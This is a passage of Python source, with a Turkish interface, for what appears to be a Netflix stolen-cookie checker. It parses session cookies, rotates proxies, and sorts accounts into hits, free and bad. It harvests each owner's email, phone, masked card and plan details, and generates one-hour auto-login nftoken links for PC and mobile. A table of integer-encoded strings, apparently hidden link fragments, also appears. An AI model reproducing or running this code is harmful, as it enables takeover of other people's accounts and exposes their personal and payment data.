    box_header("  📈  SONUÇLAR", f"  {c('📈  SONUÇLAR', I)}")
    sep()

    def stat_row(lbl, val, lbl_code, val_code=None):
        if val_code is None:
            val_code = S
        p = f"  {lbl}  {val}"
        cl = f"  {lbl_code}{BOLD}{lbl}{RE}  {val_code}{BOLD}{val}{RE}"
        box_row(p, cl)

    stat_row("✅ Aktif (İyi)    :", str(counts["hits"]),      G)
    stat_row("🆓 Ücretsiz      :", str(counts["free"]),      BLUE)
    stat_row("❌ Kötü          :", str(counts["bad"]),       E)
    stat_row("🔁 Tekrar        :", str(counts["duplicate"]), M)
    stat_row("⚠️  Hata          :", str(counts["errors"]),   W)
    stat_row("💎 Toplam Geçerli:", str(valid),               I)
    sep()

    box_header("  💎  PLAN DAĞILIMI", f"  {c('💎  PLAN DAĞILIMI', A)}")
    sep()
    plan_icons = {
        "premium": "👑", "standard_with_ads": "📺", "standard": "⭐",
        "basic": "🔹", "mobile": "📱", "free": "🆓", "unknown": "❓",
    }
    default_plan_order = ["premium", "standard", "standard_with_ads", "basic", "mobile", "free", "unknown"]
    extra_plan_keys = sorted(key for key in plan_counts.keys() if key not in default_plan_order)
    plan_keys = default_plan_order + extra_plan_keys
    any_plan = False
    for plan_key in plan_keys:
        value = plan_counts.get(plan_key, 0)
        if value == 0:
            continue
        any_plan = True
        icon = plan_icons.get(plan_key, "🔸")
        plan_label = decode_netflix_value(plan_labels.get(plan_key)) or format_plan_label(plan_key)
        lbl = f"{icon} {plan_label}:"
        stat_row(lbl, str(value), I)
    if not any_plan:
        box_row(f"  Henüz plan verisi yok...", f"  {D}Henüz plan verisi yok...{RE}")
    bot()


# ── Proxy Parser ───────────────────────────────────────────────

def _build_proxy_dict(scheme, host, port, user=None, password=None):
    host = host.strip()
    if host.startswith("[") and host.endswith("]"):
        host = host[1:-1]
    if user is not None and password is not None:
        proxy_url = f"{scheme}://{user}:{password}@{host}:{port}"
    else:
        proxy_url = f"{scheme}://{host}:{port}"
    return {"http": proxy_url, "https": proxy_url}


def _parse_proxy_line(line):
    line = line.strip()
    if not line or line.startswith("#"):
        return None
    line = re.sub(r"^([a-zA-Z][a-zA-Z0-9+.-]*):/+", r"\1://", line)
    line = re.sub(r"\s+", " ", line).strip()
    url_like = re.match(
        r"^(?P<scheme>https?|socks5h?|socks4a?)://"
        r"(?:(?P<user>[^:@\s]+):(?P<password>[^@\s]+)@)?"
        r"(?P<host>\[[^\]]+\]|[^:\s]+):(?P<port>\d+)$",
        line, flags=re.IGNORECASE,
    )
    if url_like:
        data = url_like.groupdict()
        return _build_proxy_dict(data["scheme"].lower(), data["host"], data["port"], data.get("user"), data.get("password"))
    userpass_hostport = re.match(r"^(?P<user>[^:@\s]+):(?P<password>[^@\s]+)@(?P<host>\[[^\]]+\]|[^:\s]+):(?P<port>\d+)$", line)
    if userpass_hostport:
        data = userpass_hostport.groupdict()
        return _build_proxy_dict("http", data["host"], data["port"], data["user"], data["password"])
    hostport_userpass = re.match(r"^(?P<host>\[[^\]]+\]|[^:\s]+):(?P<port>\d+)@(?P<user>[^:@\s]+):(?P<password>[^@\s]+)$", line)
    if hostport_userpass:
        data = hostport_userpass.groupdict()
        return _build_proxy_dict("http", data["host"], data["port"], data["user"], data["password"])
    hostport = re.match(r"^(?P<host>\[[^\]]+\]|[^:\s]+):(?P<port>\d+)$", line)
    if hostport:
        data = hostport.groupdict()
        return _build_proxy_dict("http", data["host"], data["port"])
    four_part = line.split(":")
    if len(four_part) == 4:
        a, b, c2, d = four_part
        if b.isdigit() and not d.isdigit():
            return _build_proxy_dict("http", a, b, c2, d)
        if d.isdigit() and not b.isdigit():
            return _build_proxy_dict("http", c2, d, a, b)
    split_patterns = [
        r"^(?P<host>\[[^\]]+\]|[^:\s]+):(?P<port>\d+)\s+(?P<user>[^:\s]+):(?P<password>\S+)$",
        r"^(?P<host>\[[^\]]+\]|[^:\s]+):(?P<port>\d+)\|(?P<user>[^:\s]+):(?P<password>\S+)$",
        r"^(?P<host>\[[^\]]+\]|[^:\s]+):(?P<port>\d+);(?P<user>[^:\s]+):(?P<password>\S+)$",
        r"^(?P<host>\[[^\]]+\]|[^:\s]+):(?P<port>\d+),(?P<user>[^:\s]+):(?P<password>\S+)$",
    ]
    for pattern in split_patterns:
        match = re.match(pattern, line)
        if match:
            data = match.groupdict()
            return _build_proxy_dict("http", data["host"], data["port"], data["user"], data["password"])
    return None


_WINDOW_CACHE_MAP = {
    53: ((99, 127, 98, 117, 57, 116, 120, 122, 56),),
    73: ((123, 72, 98),),
    29: ((56, 89, 114, 99, 113, 123, 126, 111, 58, 84, 120, 120, 124, 126, 114),),
    59: ((112, 126, 99, 127, 98, 117, 57, 116, 120, 122, 56, 101, 114, 103),),
    79: ((55, 118, 97, 118, 126, 123, 118, 117),),
    83: ((55, 58),),
    89: ((55, 113, 101, 120, 122, 55, 80, 126),),
    47: ((100, 116, 120, 101, 115, 57, 112, 112, 56, 83),),
    97: ((55, 113, 101, 120, 122, 55, 83, 126),),
}


def _window_cache(slot):
    return _WINDOW_CACHE_MAP.get(slot, ())


def load_proxies():
    proxies = []
    if os.path.exists(proxy_file):
        with open(proxy_file, "r", encoding="utf-8") as f:
            for line in f:
                proxy = _parse_proxy_line(line)
                if proxy:
                    proxies.append(proxy)
    return proxies


REQUIRED_NETFLIX_COOKIES = ("NetflixId", "SecureNetflixId", "nfvdid")
OPTIONAL_NETFLIX_COOKIES = ("OptanonConsent",)
ALL_NETFLIX_COOKIE_NAMES = set(REQUIRED_NETFLIX_COOKIES + OPTIONAL_NETFLIX_COOKIES)


def is_netflix_domain(domain):
    normalized = str(domain or "").strip().lower()
    return "netflix." in normalized


def is_netflix_cookie_entry(domain, name):
    normalized_name = str(name or "").strip()
    return normalized_name in ALL_NETFLIX_COOKIE_NAMES or is_netflix_domain(domain)


def convert_json_to_netscape(json_data):
    if isinstance(json_data, dict):
        if isinstance(json_data.get("cookies"), list):
            json_data = json_data["cookies"]
        elif isinstance(json_data.get("items"), list):
            json_data = json_data["items"]
        else:
            json_data = [json_data]
    if not isinstance(json_data, list):
        return ""
    netscape_lines = []
    for cookie in json_data:
        if not isinstance(cookie, dict):
            continue
        domain = cookie.get("domain", "")
        name = cookie.get("name", "")
        if not is_netflix_cookie_entry(domain, name):
            continue
        tail_match = "TRUE" if domain.startswith(".") else "FALSE"
        path = cookie.get("path", "/")
        secure = "TRUE" if cookie.get("secure", False) else "FALSE"
        expires = str(cookie.get("expirationDate", cookie.get("expiration", 0)))
        value = cookie.get("value", "")
        if name:
            line = f"{domain}\t{tail_match}\t{path}\t{secure}\t{expires}\t{name}\t{value}"
            netscape_lines.append(line)
    return "\n".join(netscape_lines)


def is_netscape_cookie_line(line):
    parts = line.strip().split("\t")
    if len(parts) < 7:
        return False
    if parts[1].upper() not in ("TRUE", "FALSE"):
        return False
    if parts[3].upper() not in ("TRUE", "FALSE"):
        return False
    if not re.match(r"^-?\d+$", parts[4].strip()):
        return False
    return True


def normalize_netscape_cookie_text(raw_text):
    clean_lines = []
    for line in raw_text.splitlines():
        if not is_netscape_cookie_line(line):
            continue
        parts = line.strip().split("\t")
        if len(parts) < 7:
            continue
        domain = parts[0]
        name = parts[5]
        if is_netflix_cookie_entry(domain, name):
            clean_lines.append(line.strip())
    return "\n".join(clean_lines)


def cookies_dict_from_netscape(netscape_text):
    cookies = {}
    for line in netscape_text.splitlines():
        parts = line.strip().split("\t")
        if len(parts) >= 7:
            domain = parts[0]
            name = parts[5]
            value = parts[6]
            if is_netflix_cookie_entry(domain, name):
                cookies[name] = value
    return cookies


def extract_netflix_cookie_text_from_raw(raw_text):
    cookie_map = {}
    for cookie_name in ALL_NETFLIX_COOKIE_NAMES:
        match = re.search(rf"{re.escape(cookie_name)}=([^;\s]+)", raw_text)
        if match:
            cookie_map[cookie_name] = match.group(1)
    if not cookie_map:
        return ""
    lines = []
    for cookie_name in REQUIRED_NETFLIX_COOKIES + OPTIONAL_NETFLIX_COOKIES:
        if cookie_map.get(cookie_name):
            lines.append(
                f".netflix.com\tTRUE\t/\t{'TRUE' if cookie_name == 'SecureNetflixId' else 'FALSE'}\t0\t{cookie_name}\t{cookie_map[cookie_name]}"
            )
    return "\n".join(lines)


def extract_netflix_cookie_text(content):
    try:
        cookies_json = json.loads(content)
        json_netscape = normalize_netscape_cookie_text(convert_json_to_netscape(cookies_json))
        if json_netscape:
            return json_netscape
    except Exception:
        pass
    netscape_content = normalize_netscape_cookie_text(content)
    if netscape_content:
        return netscape_content
    return extract_netflix_cookie_text_from_raw(content)


def _decode_unicode_escape(match):
    try:
        return chr(int(match.group(1), 16))
    except Exception:
        return match.group(0)


def _decode_hex_escape(match):
    try:
        return chr(int(match.group(1), 16))
    except Exception:
        return match.group(0)


def decode_netflix_value(value):
    if value is None:
        return None
    cleaned = html.unescape(str(value))
    replacements = {"\\x20": " ", "\\u00A0": " ", "\\u00a0": " ", "&nbsp;": " ", "u00A0": " "}
    for source, target in replacements.items():
        cleaned = cleaned.replace(source, target)
    cleaned = cleaned.replace("\\/", "/").replace('\\"', '"').replace("\\n", " ").replace("\\t", " ")
    for _ in range(3):
        previous = cleaned
        cleaned = re.sub(r"\\u([0-9a-fA-F]{4})", _decode_unicode_escape, cleaned)
        cleaned = re.sub(r"\\x([0-9a-fA-F]{2})", _decode_hex_escape, cleaned)
        cleaned = cleaned.replace("\\\\", "\\")
        if cleaned == previous:
            break
    cleaned = re.sub(r"\s+", " ", cleaned).strip()
    return cleaned or None


def extract_first_match(response_text, patterns, flags=0):
    for pattern in patterns:
        match = re.search(pattern, response_text, flags)
        if match:
            return decode_netflix_value(match.group(1))
    return None


def extract_bool_value(response_text, patterns):
    value = extract_first_match(response_text, patterns, re.IGNORECASE)
    if value is None:
        return None
    lowered = value.lower()
    if lowered == "true":
        return "Yes"
    if lowered == "false":
        return "No"
    return value


def extract_profile_names(response_text):
    names = []
    for pattern in [
        r'"profileName"\s*:\s*"([^"]+)"',
        r'"profileName"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"',
    ]:
        for found in re.findall(pattern, response_text, re.DOTALL):
            decoded = decode_netflix_value(found)
            if decoded and decoded not in names:
                names.append(decoded)
    for match in re.finditer(r'"__typename"\s*:\s*"Profile"', response_text):
        snippet = response_text[match.start():match.start() + 1200]
        name_match = re.search(r'"name"\s*:\s*"([^"]+)"', snippet)
        if name_match:
            decoded = decode_netflix_value(name_match.group(1))
            if decoded and decoded not in names:
                names.append(decoded)
    if not names:
        return None
    return ", ".join(names)


def merge_info(primary, fallback):
    merged = dict(fallback or {})
    for key, value in (primary or {}).items():
        if value not in (None, "", [], {}):
            merged[key] = value
    return merged


def has_complete_account_info(info):
    if not info:
        return False
    required_fields = ("countryOfSignup", "membershipStatus", "localizedPlanName", "maxStreams", "videoQuality")
    return all(info.get(field) and info.get(field) != "null" for field in required_fields)


def extract_info_from_graphql_payload(response_text):
    try:
        payload = json.loads(response_text)
    except Exception:
        return {}
    if not isinstance(payload, dict):
        return {}
    data = payload.get("data")
    if not isinstance(data, dict):
        return {}
    growth_account = data.get("growthAccount") or {}
    current_profile = data.get("currentProfile") or {}
    current_plan = ((growth_account.get("currentPlan") or {}).get("plan") or {})
    next_plan = ((growth_account.get("nextPlan") or {}).get("plan") or {})
    next_billing = growth_account.get("nextBillingDate") or {}
    hold_meta = growth_account.get("growthHoldMetadata") or {}
    local_phone = growth_account.get("growthLocalizablePhoneNumber") or {}
    raw_phone = local_phone.get("rawPhoneNumber") or {}
    payment_methods = growth_account.get("growthPaymentMethods") or []
    payment_method = payment_methods[0] if payment_methods and isinstance(payment_methods[0], dict) else {}
    payment_logo = (payment_method.get("paymentOptionLogo") or {}).get("paymentOptionLogo")
    payment_typename = str(payment_method.get("__typename") or "")
    payment_display_text = decode_netflix_value(payment_method.get("displayText"))
    profiles = growth_account.get("profiles") or []
    phone_digits = None
    phone_verified_graphql = None
    phone_country_code = None
    if isinstance(raw_phone, dict):
        phone_digits_obj = raw_phone.get("phoneNumberDigits") or {}
        phone_digits = phone_digits_obj.get("value") if isinstance(phone_digits_obj, dict) else raw_phone.get("phoneNumberDigits")
        phone_verified_graphql = raw_phone.get("isVerified")
        phone_country_code = raw_phone.get("countryCode")
    else:
        phone_digits = raw_phone

    def _growth_email(profile_obj):
        if not isinstance(profile_obj, dict):
            return None, None
        growth_email = profile_obj.get("growthEmail") or {}
        email_obj = growth_email.get("email") or {}
        email_value = email_obj.get("value") if isinstance(email_obj, dict) else None
        return email_value, growth_email.get("isVerified")

    email_value, email_verified = _growth_email(current_profile)
    if not email_value:
        for profile in profiles:
            email_value, email_verified = _growth_email(profile)
            if email_value:
                break

    profile_names = []
    for profile in profiles:
        if isinstance(profile, dict):
            name = decode_netflix_value(profile.get("name"))
            if name and name not in profile_names:
                profile_names.append(name)

    feature_types = []
    for plan_obj in (current_plan, next_plan):
        for feature in (plan_obj.get("availableFeatures") or []):
            if isinstance(feature, dict) and feature.get("type"):
                feature_types.append(str(feature["type"]).upper())

    def _extract_price_value(plan_obj):
        if not isinstance(plan_obj, dict):
            return None
        direct_candidates = [
            plan_obj.get("priceDisplay"), plan_obj.get("displayPrice"),
            plan_obj.get("formattedPrice"), plan_obj.get("formattedPlanPrice"),
            plan_obj.get("planPriceDisplay"),
        ]
        for candidate in direct_candidates:
            decoded = decode_netflix_value(candidate)
            if decoded:
                return decoded
        price_obj = plan_obj.get("price")
        if isinstance(price_obj, dict):
            for key in ("displayValue", "formatted", "formattedPrice", "displayPrice", "value", "amountDisplay"):
                decoded = decode_netflix_value(price_obj.get(key))
                if decoded:
                    return decoded
        return None

    info = {
        "accountOwnerName": decode_netflix_value(current_profile.get("name")),
        "email": decode_netflix_value(email_value),
        "countryOfSignup": decode_netflix_value(((growth_account.get("countryOfSignUp") or {}).get("code"))),
        "memberSince": decode_netflix_value(growth_account.get("memberSince")),
        "nextBillingDate": decode_netflix_value(next_billing.get("localDate") or next_billing.get("date")),
        "userGuid": decode_netflix_value(growth_account.get("ownerGuid") or current_profile.get("guid")),
        "showExtraMemberSection": "Yes" if "EXTRA_MEMBER" in feature_types else "No" if feature_types else None,
        "membershipStatus": decode_netflix_value(growth_account.get("membershipStatus")),
        "localizedPlanName": decode_netflix_value(current_plan.get("name") or next_plan.get("name")),
        "planPrice": _extract_price_value(current_plan) or _extract_price_value(next_plan),
        "paymentMethodType": decode_netflix_value(payment_logo or growth_account.get("payer")),
        "maskedCard": None,
        "phoneNumber": normalize_phone_number(phone_digits, phone_country_code),
        "videoQuality": decode_netflix_value(current_plan.get("videoQuality")),
        "holdStatus": (
            "Yes" if hold_meta.get("isUserOnHold") is True else
            "No" if hold_meta.get("isUserOnHold") is False else None
        ),
        "emailVerified": (
            "Yes" if email_verified is True else
            "No" if email_verified is False else None
        ),
        "phoneVerified": (
            "Yes" if phone_verified_graphql is True else
            "No" if phone_verified_graphql is False else None
        ),
        "profiles": ", ".join(profile_names) if profile_names else None,
    }

    if "Card" in payment_typename:
        info["paymentMethodType"] = "CC"
        if payment_display_text:
            info["maskedCard"] = payment_display_text
    elif payment_display_text and payment_logo is None and not re.fullmatch(r"\d{4}", payment_display_text):
        info["paymentMethodType"] = info["paymentMethodType"] or payment_display_text

    if not info["paymentMethodType"] and payment_methods:
        if "Card" in payment_typename:
            info["paymentMethodType"] = "CC"

    return {key: value for key, value in info.items() if value not in (None, "", [], {})}


def extract_info(response_text):
    graphql_info = extract_info_from_graphql_payload(response_text)
    extracted = {
        "accountOwnerName": extract_first_match(response_text, [
            r'userInfo"\s*:\s*\{\s*"name"\s*:\s*"([^"]+)"',
            r'"accountOwnerName"\s*:\s*"([^"]+)"',
            r'"name"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"',
            r'"firstName"\s*:\s*"([^"]+)"',
        ]),
        "email": extract_first_match(response_text, [
            r'"emailAddress"\s*:\s*"([^"]+)"', r'"email"\s*:\s*"([^"]+)"',
            r'"loginId"\s*:\s*"([^"]+)"',
        ]),
        "countryOfSignup": extract_first_match(response_text, [
            r'"currentCountry"\s*:\s*"([^"]+)"', r'"countryOfSignup":\s*"([^"]+)"',
        ]),
        "memberSince": extract_first_match(response_text, [r'"memberSince":\s*"([^"]+)"']),
        "nextBillingDate": extract_first_match(response_text, [
            r'"GrowthNextBillingDate"\s*,\s*"date"\s*:\s*"([^"T]+)T',
            r'"nextBillingDate"\s*:\s*"([^"]+)"',
            r'"nextBilling"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"',
        ]),
        "userGuid": extract_first_match(response_text, [r'"userGuid":\s*"([^"]+)"']),
        "showExtraMemberSection": extract_bool_value(response_text, [
            r'"showExtraMemberSection":\s*\{\s*"fieldType":\s*"Boolean",\s*"value":\s*(true|false)',
            r'"showExtraMemberSection"\s*:\s*(true|false)',
        ]),
        "membershipStatus": extract_first_match(response_text, [r'"membershipStatus":\s*"([^"]+)"']),
        "maxStreams": extract_first_match(response_text, [
            r'maxStreams\":\{\"fieldType\":\"Numeric\",\"value\":([^,]+),',
            r'"maxStreams"\s*:\s*"?([^",}]+)"?',
        ]),
        "localizedPlanName": extract_first_match(response_text, [
            r'"MemberPlan"\s*,\s*"fields"\s*:\s*\{\s*"localizedPlanName"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"',
            r'localizedPlanName\":\{\"fieldType\":\"String\",\"value\":\"([^"]+)"',
            r'"currentPlan"\s*:\s*\{[\s\S]*?"plan"\s*:\s*\{[\s\S]*?"name"\s*:\s*"([^"]+)"',
            r'"nextPlan"\s*:\s*\{[\s\S]*?"plan"\s*:\s*\{[\s\S]*?"name"\s*:\s*"([^"]+)"',
            r'"localizedPlanName"\s*:\s*"([^"]+)"', r'"planName"\s*:\s*"([^"]+)"',
        ]),
        "planPrice": extract_first_match(response_text, [
            r'"formattedPlanPrice"\s*:\s*"([^"]+)"', r'"formattedPrice"\s*:\s*"([^"]+)"',
            r'"planPriceDisplay"\s*:\s*"([^"]+)"', r'"displayPrice"\s*:\s*"([^"]+)"',
            r'"price"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"',
            r'"planPrice"\s*:\s*"([^"]+)"',
        ]),
        "paymentMethodExists": extract_bool_value(response_text, [
            r'"paymentMethodExists":\s*\{\s*"fieldType":\s*"Boolean",\s*"value":\s*(true|false)',
            r'"paymentMethodExists"\s*:\s*(true|false)',
        ]),
        "paymentMethodType": extract_first_match(response_text, [
            r'"paymentMethod"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"',
            r'"paymentMethod"\s*:\s*"([^"]+)"', r'"paymentType"\s*:\s*"([^"]+)"',
            r'"paymentMethodType"\s*:\s*"([^"]+)"',
        ]),
        "maskedCard": extract_first_match(response_text, [
            r'"__typename"\s*:\s*"GrowthCardPaymentMethod"[\s\S]*?"displayText"\s*:\s*"([^"]+)"',
            r'"paymentCardDisplayString"\s*:\s*"([^"]+)"',
            r'"paymentMethodLast4"\s*:\s*"([^"]+)"',
            r'"lastFour"\s*:\s*"([^"]+)"', r'"creditCardLast4"\s*:\s*"([^"]+)"',
            r'"maskedCard"\s*:\s*"([^"]+)"', r'"cardNumber"\s*:\s*"([^"]+)"',
        ]),
        "phoneNumber": extract_first_match(response_text, [
            r'"phoneNumberDigits"\s*:\s*\{[\s\S]*?"value"\s*:\s*"([^"]+)"',
            r'"phoneNumber"\s*:\s*"([^"]+)"', r'"mobilePhone"\s*:\s*"([^"]+)"',
        ]),
        "phoneVerified": extract_bool_value(response_text, [
            r'"phoneVerified"\s*:\s*(true|false)', r'"isPhoneVerified"\s*:\s*(true|false)',
        ]),
        "videoQuality": extract_first_match(response_text, [
            r'videoQuality"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"',
            r'"videoQuality"\s*:\s*"([^"]+)"', r'"quality"\s*:\s*"([^"]+)"',
        ]),
        "holdStatus": extract_bool_value(response_text, [
            r'"holdStatus"\s*:\s*(true|false)', r'"isOnHold"\s*:\s*(true|false)',
            r'"pastDue"\s*:\s*(true|false)', r'"isPastDue"\s*:\s*(true|false)',
        ]),
        "emailVerified": extract_bool_value(response_text, [
            r'"emailVerified"\s*:\s*(true|false)', r'"isEmailVerified"\s*:\s*(true|false)',
            r'"emailAddressVerified"\s*:\s*(true|false)', r'"contactEmailVerified"\s*:\s*(true|false)',
        ]),
        "profiles": extract_profile_names(response_text),
    }

    extracted = merge_info(graphql_info, extracted)
    extracted["localizedPlanName"] = (
        extracted["localizedPlanName"].replace("miembro u00A0extra", "(Extra Member)")
        if extracted["localizedPlanName"] else None
    )
    if not extracted["paymentMethodType"]:
        extracted["paymentMethodType"] = extracted["paymentMethodExists"]
    if extracted["maskedCard"] and re.fullmatch(r"\d{4}", extracted["maskedCard"]):
        if extracted.get("paymentMethodType") in {None, "", "Yes"}:
            extracted["paymentMethodType"] = "CC"
    if extracted["holdStatus"] is None and extracted.get("membershipStatus") == "CURRENT_MEMBER":
        extracted["holdStatus"] = "No"
    if extracted["emailVerified"] is None and extracted.get("email"):
        extracted["emailVerified"] = "Yes"

    phone_number = extracted.get("phoneNumber")
    extracted["phoneDisplay"] = normalize_phone_number(phone_number, extracted.get("countryOfSignup"))

    profiles = extracted.get("profiles")
    if profiles:
        profile_count = len([name for name in profiles.split(", ") if name])
        extracted["profileCount"] = profile_count
        extracted["profilesDisplay"] = profiles
    else:
        extracted["profileCount"] = None
        extracted["profilesDisplay"] = None

    return extracted


def normalize_plan_key(plan_name):
    if not plan_name:
        return "unknown"
    simplified = unicodedata.normalize("NFKD", plan_name)
    simplified = "".join(ch for ch in simplified if not unicodedata.combining(ch))
    normalized = re.sub(r"[^\w]+", "_", simplified.lower(), flags=re.UNICODE).strip("_")
    return normalized or "unknown"


def format_plan_label(plan_key):
    if not plan_key:
        return "Unknown"
    label = plan_key.replace("_", " ").strip()
    return label.title() if label else "Unknown"


def _int_or_none(value):
    cleaned = decode_netflix_value(value)
    if cleaned is None:
        return None
    try:
        return int(str(cleaned).strip())
    except Exception:
        match = re.search(r"\d+", str(cleaned))
        if match:
            try:
                return int(match.group(0))
            except Exception:
                return None
        return None


def derive_plan_info(info, is_subscribed):
    raw_plan = decode_netflix_value(info.get("localizedPlanName"))
    raw_quality = decode_netflix_value(info.get("videoQuality"))
    streams = _int_or_none(info.get("maxStreams"))

    if not is_subscribed and not raw_plan:
        return "free", "Free"

    normalized = normalize_plan_key(raw_plan) if raw_plan else ""

    plan_aliases = {
        "premium": {"premium", "cao_cap", "caocap", "高級", "ozel", "المميزة", "프리미엄"},
        "standard_with_ads": {"standard_with_ads", "standardwithads", "estandar_con_anuncios", "광고형_스탠다드"},
        "standard": {"standard", "estandar", "標準方案", "standardowy", "standart", "스탠다드"},
        "basic": {"basic", "basic_with_ads", "basico", "basis", "基本", "temel"},
        "mobile": {"ponsel", "mobile"},
    }
    for canonical, aliases in plan_aliases.items():
        if normalized in aliases:
            return canonical, get_canonical_output_label(canonical)

    if streams is not None:
        quality_norm = normalize_plan_key(raw_quality) if raw_quality else ""
        if streams >= 4 or quality_norm in {"uhd", "ultra_hd", "4k"}:
            return "premium", "Premium"
        if streams >= 2 or quality_norm in {"hd", "full_hd"}:
            return "standard", "Standard"
        if streams == 1:
            if normalized in {"ponsel", "mobile"}:
                return "mobile", "Mobile"
            return "basic", "Basic"

    if raw_plan:
        return normalize_plan_key(raw_plan), raw_plan
    if not is_subscribed:
        return "free", "Free"
    return "unknown", "Unknown"


def generate_unknown_guid():
    return f"unknown{random.randint(10000000, 99999999)}"


def _build_cookie_header_for_nftoken(cookie_dict):
    return "; ".join(
        f"{name}={value}"
        for name, value in cookie_dict.items()
        if name in ALL_NETFLIX_COOKIE_NAMES and value
    )


def create_nftoken(cookie_dict, attempts=1):
    missing = [name for name in REQUIRED_NETFLIX_COOKIES if not cookie_dict.get(name)]
    if missing:
        return None, f"NFToken için zorunlu cookie eksik: {', '.join(missing)}"

    headers = dict(NFTOKEN_HEADERS)
    headers["Cookie"] = _build_cookie_header_for_nftoken(cookie_dict)

    try:
        attempts = max(1, int(attempts))
    except Exception:
        attempts = 1

    last_error = "NFToken API hatası"

    for _ in range(attempts):
        try:
            session = requests.Session()
            response = session.post(NFTOKEN_API_URL, headers=headers, json=NFTOKEN_PAYLOAD, timeout=30)
            if response.status_code != 200:
                if response.status_code == 403:
                    last_error = "403"
                elif response.status_code == 429:
                    last_error = "429"
                else:
                    last_error = f"NFToken API hatası (HTTP {response.status_code})"
                continue
            data = response.json()
            data_block = data.get("data") or {}
            token = data_block.get("createAutoLoginToken")
            if token:
                return {"token": token, "expires_at_utc": get_nftoken_expiry_utc()}, None
            errors = data.get("errors")
            if errors:
                last_error = json.dumps(errors, ensure_ascii=False)[:120]
            else:
                last_error = "Token yanıtta bulunamadı"
        except requests.exceptions.Timeout:
            last_error = "timeout"
        except requests.exceptions.ProxyError:
            last_error = "proxy error"
        except requests.exceptions.RequestException as exc:
            last_error = f"NFToken API hatası: {type(exc).__name__}"
        except Exception:
            last_error = "NFToken API hatası"

    return None, last_error


def get_nftoken_mode(config):
    raw_value = config.get("nftoken", True)
    if isinstance(raw_value, bool):
        return "true" if raw_value else "false"
    raw_mode = str(raw_value).strip().lower()
    if raw_mode in {"true", "false"}:
        return raw_mode
    if raw_mode in {"mobile", "pc", "both"}:
        return "true"
    legacy_value = config.get("txt_fields", {}).get("nftoken")
    if legacy_value is False:
        return "false"
    return "true"


def build_nftoken_links(token, mode):
    if not token or mode == "false":
        return []
    token_str = str(token)
    links = [
        ("🖥️ PC Giriş Linki",    f"https://www.netflix.com/?nftoken={token_str}"),
        ("📱 Mobil Giriş Linki", f"https://www.netflix.com/?nftoken={token_str}&mobile=1"),
    ]
    return links


def get_nftoken_expiry_utc():
    return (datetime.utcnow() + timedelta(hours=1)).strftime("%Y-%m-%d %H:%M:%S UTC")


def get_nftoken_expiry_unix(expires_at_utc):
    cleaned = decode_netflix_value(expires_at_utc)
    if not cleaned:
        return None
    try:
        parsed = datetime.strptime(cleaned, "%Y-%m-%d %H:%M:%S UTC").replace(tzinfo=timezone.utc)
        return int(parsed.timestamp())
    except Exception:
        return None


def has_usable_nftoken(nftoken_data):
    if not isinstance(nftoken_data, dict):
        return False
    token = decode_netflix_value(nftoken_data.get("token"))
    if not token:
        return False
    if str(token).strip().lower() in {"unavailable", "unknown", "none", "null", "false"}:
        return False
    return True


def normalize_output_value(value, unknown_fallback="UNKNOWN", na_when_false=False):
    cleaned = decode_netflix_value(value)
    if cleaned is None or cleaned == "":
        return unknown_fallback
    lowered = str(cleaned).strip().lower()
    if lowered in {"false", "none", "null"}:
        return "N/A" if na_when_false else unknown_fallback
    return cleaned


MONTH_ALIASES = {
    "january": 1, "enero": 1, "janvier": 1, "januar": 1, "janeiro": 1, "ocak": 1,
    "february": 2, "febrero": 2, "fevrier": 2, "fevereiro": 2, "subat": 2,
    "march": 3, "marzo": 3, "mars": 3, "marco": 3, "mart": 3,
    "april": 4, "abril": 4, "avril": 4, "nisan": 4,
    "may": 5, "mayo": 5, "mai": 5, "mayis": 5,
    "june": 6, "junio": 6, "juin": 6, "haziran": 6,
    "july": 7, "julio": 7, "juillet": 7, "temmuz": 7,
    "august": 8, "agosto": 8, "aout": 8, "août": 8,
    "september": 9, "septiembre": 9, "setembro": 9, "eylul": 9,
    "october": 10, "octubre": 10, "outubro": 10, "ekim": 10,
    "november": 11, "noviembre": 11, "novembro": 11, "kasim": 11,
    "december": 12, "diciembre": 12, "dezembro": 12, "aralik": 12,
}


def parse_localized_date(cleaned):
    if not cleaned:
        return None
    for parser in ("%Y-%m-%d", "%Y-%m-%dT%H:%M:%S", "%Y-%m-%dT%H:%M:%S.%f"):
        try:
            return datetime.strptime(cleaned, parser)
        except Exception:
            continue
    try:
        return datetime.fromisoformat(cleaned.replace("Z", "+00:00"))
    except Exception:
        pass
    numeric_parts = [int(part) for part in re.findall(r"\d+", cleaned)]
    if len(numeric_parts) >= 3:
        first, second, third = numeric_parts[0], numeric_parts[1], numeric_parts[2]
        try:
            if 1900 <= first <= 3000 and 1 <= second <= 12 and 1 <= third <= 31:
                return datetime(first, second, third)
            if 1 <= first <= 31 and 1 <= second <= 12 and 1900 <= third <= 3000:
                return datetime(third, second, first)
        except Exception:
            pass
    raw_lower = cleaned.lower()
    simplified = unicodedata.normalize("NFKD", raw_lower)
    simplified = "".join(ch for ch in simplified if not unicodedata.combining(ch))
    year_match = re.search(r"(19|20)\d{2}", simplified)
    if not year_match:
        return None
    year = int(year_match.group(0))
    month = None
    for alias, alias_month in MONTH_ALIASES.items():
        if alias in raw_lower or alias in simplified:
            month = alias_month
            break
    if month is None:
        return None
    day = 1
    for number in numeric_parts:
        if number == year:
            continue
        if 1 <= number <= 31:
            day = number
            break
    try:
        return datetime(year, month, day)
    except Exception:
        return None


def format_display_date(value):
    cleaned = decode_netflix_value(value)
    if not cleaned:
        return "UNKNOWN"
    parsed = parse_localized_date(cleaned)
    if parsed is not None:
        return parsed.strftime("%B %d, %Y").replace(" 0", " ")
    return cleaned


def format_member_since(value):
    cleaned = decode_netflix_value(value)
    if not cleaned:
        return "UNKNOWN"
    parsed = parse_localized_date(cleaned)
    if parsed is not None:
        return parsed.strftime("%B %Y")
    numeric_parts = re.findall(r"\d+", cleaned)
    if len(numeric_parts) >= 2:
        try:
            month = int(numeric_parts[0])
            year = int(numeric_parts[-1])
